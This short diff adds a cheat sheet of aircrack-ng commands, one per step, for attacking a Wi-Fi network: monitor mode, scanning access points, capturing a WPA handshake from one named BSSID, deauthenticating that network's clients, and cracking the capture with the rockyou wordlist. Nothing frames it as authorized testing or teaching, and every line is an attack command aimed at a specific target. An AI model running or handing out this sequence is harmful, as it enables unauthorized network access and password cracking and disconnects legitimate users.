@@ -1,0 +1,9 @@
+monitor mode=       airmon-ng start wlan0
+
+list of bssid=      airodump-ng wlan0mon
+
+handshake capture=  airodump-ng --bssid E4:C3:2A:58:0B:B2 -c 10 -w path-name-to-save-cap-file  wlan0mon
+
+deauth=             aireplay-ng -0 10 -a E4:C3:2A:58:0B:B2 wlan0mon
+
+crack=              aircrack-ng -w rockyou.txt abcd.cap
